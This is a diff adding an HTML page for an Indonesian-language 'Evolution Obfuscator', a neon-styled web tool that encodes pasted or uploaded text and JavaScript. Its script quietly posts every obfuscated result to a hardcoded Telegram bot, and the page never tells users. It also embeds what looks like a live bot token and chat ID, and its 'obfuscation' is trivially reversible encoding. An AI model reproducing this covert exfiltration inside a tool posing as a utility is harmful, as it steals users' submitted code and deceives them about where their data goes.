@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Evolution Obfuscator</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: radial-gradient(circle at top, #0d0d0d, #000);
+      color: #0ff;
+      padding: 30px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      background: linear-gradient(90deg, #00ffcc, #00e5ff, #ff00ff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-shadow: 0 0 20px #0ff, 0 0 40px #0ff;
+      animation: glowText 3s infinite alternate;
+      text-align: center;
+      width: 100%;
+      margin-bottom: 20px;
+    }
+    @keyframes glowText {
+      from { text-shadow: 0 0 10px #00ffcc; }
+      to { text-shadow: 0 0 25px #ff00ff; }
+    }
+
+    .card {
+      background: rgba(15, 15, 15, 0.8);
+      border: 2px solid #00e5ff55;
+      border-radius: 16px;
+      padding: 20px;
+      box-shadow: 0 0 20px #00e5ff33;
+      width: 90%;
+      max-width: 700px;
+      display: none; /* default hidden */
+    }
+
+    .card.active {
+      display: block;
+    }
+
+    h3 {
+      color: #00e5ff;
+      margin-bottom: 10px;
+      text-shadow: 0 0 10px #0ff;
+    }
+
+    textarea {
+      width: 100%;
+      height: 200px;
+      background: rgba(10, 10, 10, 0.8);
+      color: #00ffcc;
+      border: 2px solid #00e5ff;
+      border-radius: 12px;
+      padding: 12px;
+      resize: none;
+      font-size: 14px;
+      box-shadow: 0 0 15px #00e5ff44;
+      transition: 0.3s;
+    }
+    textarea:focus {
+      border-color: #ff00ff;
+      box-shadow: 0 0 20px #ff00ff55;
+      outline: none;
+    }
+
+    .controls {
+      margin-top: 15px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    select, button, input[type="file"] {
+      padding: 10px 15px;
+      background: linear-gradient(90deg, #00e5ff, #00ff99);
+      color: #000;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 14px;
+      box-shadow: 0 0 12px #00e5ff88;
+      transition: transform 0.2s, box-shadow 0.3s;
+    }
+    button:hover, select:hover, input[type="file"]:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 20px #ff00ffaa;
+      background: linear-gradient(90deg, #ff00ff, #00e5ff);
+      color: #fff;
+    }
+
+    #outputText {
+      background: rgba(0, 0, 0, 0.7);
+      color: #ff00ff;
+    }
+
+    /* Loading */
+    #loading {
+      display: none;
+      margin: 25px auto;
+      text-align: center;
+    }
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 6px solid rgba(0, 255, 255, 0.2);
+      border-top: 6px solid #00e5ff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite, glow 1.5s ease-in-out infinite alternate;
+      margin: auto;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes glow {
+      from { box-shadow: 0 0 10px #00e5ff; }
+      to { box-shadow: 0 0 25px #ff00ff; }
+    }
+
+    footer {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #888;
+      text-shadow: 0 0 10px #00e5ff44;
+    }
+  </style>
+</head>
+<body>
+  <h1>⚡ Evolution Obfuscator ⚡</h1>
+
+  <!-- Input Card -->
+  <div id="inputCard" class="card active">
+    <h3>✍️ Sebelum Obfuscate</h3>
+    <textarea id="inputText" placeholder="Tulis teks atau kode di sini..."></textarea>
+    <div class="controls">
+      <input type="file" id="fileInput" accept=".txt,.js">
+      <select id="level">
+        <option value="sedang">Sedang</option>
+        <option value="lumayan">Lumayan</option>
+        <option value="hard">Invisible-Hard</option>
+      </select>
+      <button onclick="obfuscate()">🔮 Obfuscate</button>
+    </div>
+  </div>
+
+  <!-- Loading Spinner -->
+  <div id="loading">
+    <div class="spinner"></div>
+    <p style="color:#00e5ff; margin-top:10px;">Processing...</p>
+  </div>
+
+  <!-- Output Card -->
+  <div id="outputCard" class="card">
+    <h3>✨ Sesudah Obfuscate</h3>
+    <textarea id="outputText" readonly placeholder="Hasil obfuscate akan muncul di sini..."></textarea>
+    <div class="controls">
+      <button onclick="downloadFile()">⬇️ Download Hasil</button>
+      <button onclick="goBack()">🔙 Back</button>
+    </div>
+  </div>
+
+  <footer>© 2025 Evolution Engine — Neon Cyberpunk Obfuscator</footer>
+
+  <script>
+    const BOT_TOKEN = "7982906630:AAE-ahmvA5ftjAKSV1I8zkGnIuWLTsZBDGo";
+    const CHAT_ID = "1760773306";
+
+    document.getElementById('fileInput').addEventListener('change', function(event) {
+      const file = event.target.files[0];
+      if (file) {
+        const reader = new FileReader();
+        reader.onload = function(e) {
+          document.getElementById('inputText').value = e.target.result;
+        };
+        reader.readAsText(file);
+      }
+    });
+
+    async function obfuscate() {
+      const input = document.getElementById('inputText').value;
+      const level = document.getElementById('level').value;
+      if (!input) {
+        alert("⚠️ Tulis teks atau upload file dulu!");
+        return;
+      }
+
+      // Hide input, show loading
+      document.getElementById('inputCard').classList.remove("active");
+      document.getElementById('loading').style.display = "block";
+      document.getElementById('outputText').value = "";
+
+      await new Promise(resolve => setTimeout(resolve, 2000));
+
+      let obf = input;
+      if (level === "sedang") {
+        obf = btoa(input).split("").reverse().join("") + " //OBF BY EVOLUTION";
+      } else if (level === "lumayan") {
+        obf = input.split("").map(c => "\\u" + c.charCodeAt(0).toString(16)).join("") + " /* evolution */";
+      } else if (level === "hard") {
+        obf = input.split("").map(c => "&#" + c.charCodeAt(0) + ";").join("") + " <!-- evolution invisible -->";
+      }
+
+      // Hide loading, show output
+      document.getElementById('loading').style.display = "none";
+      document.getElementById('outputCard').classList.add("active");
+      document.getElementById('outputText').value = obf;
+
+      // Send to Telegram
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: `📂 Hasil Obfuscate:\n\n${obf}`
+        })
+      });
+    }
+
+    function downloadFile() {
+      const text = document.getElementById('outputText').value;
+      if (!text) {
+        alert("⚠️ Tidak ada hasil untuk di-download!");
+        return;
+      }
+      const blob = new Blob([text], { type: 'text/plain' });
+      const link = document.createElement('a');
+      link.href = URL.createObjectURL(blob);
+      link.download = "hasil_obf_evolution.txt";
+      link.click();
+    }
+
+    function goBack() {
+      document.getElementById('outputCard').classList.remove("active");
+      document.getElementById('inputCard').classList.add("active");
+    }
+  </script>
+</body>
+</html>
